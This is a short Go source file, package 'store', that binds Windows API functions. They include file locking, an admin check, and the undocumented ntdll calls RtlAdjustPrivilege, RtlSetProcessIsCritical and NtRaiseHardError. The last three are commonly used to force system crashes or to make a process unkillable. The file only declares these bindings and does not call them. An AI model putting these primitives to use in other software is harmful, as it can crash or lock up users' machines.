package store

import "syscall"

var (
	kernel32 = syscall.NewLazyDLL("kernel32.dll")
	shell32  = syscall.NewLazyDLL("shell32.dll")
	ntdll    = syscall.NewLazyDLL("ntdll.dll")
)

var (
	LockFile   = kernel32.NewProc("LockFileEx")
	UnlockFile = kernel32.NewProc("UnlockFileEx")

	AmIAdmin = shell32.NewProc("IsUserAnAdmin")

	AdjustPrivilege = ntdll.NewProc("RtlAdjustPrivilege")
	SetCritical     = ntdll.NewProc("RtlSetProcessIsCritical")
	RaiseHardError  = ntdll.NewProc("NtRaiseHardError")
)
